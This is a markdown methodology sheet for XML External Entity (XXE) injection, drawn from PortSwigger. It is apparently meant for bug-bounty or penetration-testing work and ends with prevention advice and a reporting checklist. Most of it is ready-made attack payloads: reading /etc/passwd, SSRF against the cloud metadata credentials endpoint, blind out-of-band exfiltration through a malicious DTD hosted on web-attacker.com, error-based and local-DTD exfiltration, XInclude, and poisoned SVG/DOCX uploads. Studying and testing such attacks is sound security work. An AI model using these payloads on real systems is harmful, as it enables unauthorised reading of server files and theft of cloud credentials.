# XXE Injection — Reference

Comprehensive payloads and methodology for XML External Entity injection.
Sources:
- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/blind

---

## 1. XML entities & DTDs background

XML supports a Document Type Definition (DTD), which can declare **entities**. An entity is
a placeholder that the parser substitutes when it encounters a reference.

- **General entity**: referenced with `&name;` in the document body.
- **External entity**: value loaded from a URI via `SYSTEM`:
  `<!ENTITY name SYSTEM "URI">` — the URI may be `file://`, `http://`, `ftp://`,
  `php://`, `expect://` (PHP), etc.
- **Parameter entity**: usable only within the DTD, declared and referenced with `%`:
  `<!ENTITY % name SYSTEM "URI">` ... `%name;`

XXE arises because standard parsers support these features by default even when the
application never intends to use them. Attacks: file disclosure, SSRF, OOB exfiltration,
sometimes RCE/DoS.

---

## 2. In-band file retrieval

Define an external entity and reference it in a field whose value is reflected in the response.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

The response that normally echoes the product ID now contains the file contents.

Useful targets: `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`, `/proc/self/cmdline`,
app config (`/var/www/.../config.php`, `application.properties`, `.env`), cloud creds files.

Notes:
- Files with `<`, `&`, or `]]>` can break XML parsing; for those use a base64 wrapper
  (PHP filter) or OOB/error-based exfil:
  `php://filter/convert.base64-encode/resource=/path/to/file`.

---

## 3. SSRF via XXE

Point an external entity at an internal/loopback/metadata URL; the server makes the request.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

Cloud metadata (high impact — frequently yields IAM/instance credentials):

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
```

Walk the metadata tree (AWS): `.../iam/security-credentials/` then append the role name.
GCP uses `http://metadata.google.internal/computeMetadata/v1/` (often needs a header, which
plain XXE can't add — note the limitation). If the response is reflected you read it inline;
otherwise combine with the blind techniques below.

---

## 4. Blind XXE

When entity values are NOT reflected in the response.

### 4a. Detect via OAST / out-of-band interaction
Make the parser hit an attacker-controlled host and watch for DNS/HTTP callbacks.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

If general entities are filtered, use a parameter entity:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

A pingback confirms blind XXE even with no reflected output.

### 4b. Out-of-band data exfiltration via external DTD
Host this DTD at `http://web-attacker.com/malicious.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Then submit the in-band payload that loads and triggers it:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Mechanics: `%file` reads the target file; `%eval` defines `%exfiltrate` whose URL contains
the file contents (`&#x25;` is an encoded `%`, needed because parameter-entity references
inside a markup declaration must be encoded); `%exfiltrate` then makes the request,
delivering the data to your server's query string / access log.
The external-DTD indirection is required because XML forbids referencing a parameter
entity within another markup declaration in the *internal* subset.

### 4c. Error-based exfiltration
When outbound network egress is blocked, force a parse error containing the file contents.
External DTD (`malicious.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Loading `file:///nonexistent/<contents>` fails, and the parser emits an error message that
includes the (nonexistent) path — i.e., the file contents — in the HTTP response.

### 4d. Repurposing a local DTD (no outbound egress, can't host external DTD)
If you cannot reach an external DTD but a DTD file exists locally on the server, redefine
one of its parameter entities to run the error-based exfil. The internal subset is allowed
to redefine entities declared in an external DTD (a spec loophole).

First, locate a local DTD (try common paths):

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
```

Then repurpose it (example redefines an entity used inside the loaded DTD):

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;error;
'>
%local_dtd;
]>
```

Common local DTD candidates: `/usr/share/yelp/dtd/docbookx.dtd`,
`/usr/share/xml/fontconfig/fonts.dtd`, and OS/package-specific schema files.

---

## 5. XInclude attacks

Use when you do NOT control the whole XML document — e.g., your input is one value the
server embeds into a server-side XML document, so you cannot add a DOCTYPE. XInclude is a
separate spec and only needs a namespace declaration:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

`parse="text"` returns raw file contents; you can also XInclude over `http://` for SSRF.

---

## 6. XXE via file upload

Many formats are XML under the hood; if the server parses them, the entity fires.

- **SVG** (image uploads, avatars, thumbnails):
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
    <text x="0" y="20">&xxe;</text>
  </svg>
  ```
  Read the rendered/raster output or any echoed text. If image processing rasterizes the
  SVG, the file contents appear in the rendered image.
- **Office Open XML (DOCX/XLSX/PPTX)**: unzip, inject the DOCTYPE/entity into a contained
  XML part (e.g., `word/document.xml`, `[Content_Types].xml`), re-zip, upload. Effective
  against document/spreadsheet processors and report/preview generators.
- **Other XML-backed formats**: GPX, KML, RSS/Atom, XMP metadata embedded in PDFs/images.

---

## 7. XXE via modified Content-Type

A POST endpoint may default to `application/x-www-form-urlencoded` but route to a parser
that also accepts XML. Switch the header and reformat the body:

```
POST /action HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><param>&xxe;</param></root>
```

Try `application/xml`, `text/xml`. Map form field names to XML element names.

---

## 8. Finding hidden attack surface

- Endpoints whose normal request format isn't XML but whose backend may still parse XML
  (content-type switching above).
- File-upload features (SVG/Office/PDF/feed imports), document/report generators,
  preview/thumbnail services.
- SAML SSO, WS-Security, XML-RPC, SOAP services.
- Any value that is later placed into a server-side XML document → XInclude candidate.
- Subtle XXE: even when only a parameter is XML-embedded, parameter entities + external/
  local DTD may still allow blind exfil.

---

## 9. Prevention (for triage / report remediation)

The most effective fix is to disable the dangerous parser features:

- **Disable DTD processing entirely** (preferred): e.g.
  `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
  (Java); `libxml_disable_entity_loader(true)` / avoid `LIBXML_NOENT` (PHP);
  `defusedxml` (Python).
- If DTDs are required, **disable external entity and external DTD resolution**
  (`external-general-entities`, `external-parameter-entities` = false).
- **Disable XInclude** support.
- Validate/avoid passing untrusted data to XML parsers; prefer non-XML formats (JSON) where
  possible.

---

## 10. Reporting checklist (impact-first, per workspace doctrine)

Log to `./_EXPLOIT/` only when PROVEN:
- File read: response/error/exfil log showing actual file contents (start with a benign
  file like `/etc/hostname`, escalate to `/etc/passwd` or secrets only as needed).
- SSRF: OAST hit or reflected internal/metadata response (cloud creds = high severity).
- Blind: collaborator/OAST callback log entry tied to your payload.
Include the minimal curl/request that reproduces it. Do NOT submit theoretical
"parser accepts DTD" findings or run entity-expansion DoS.
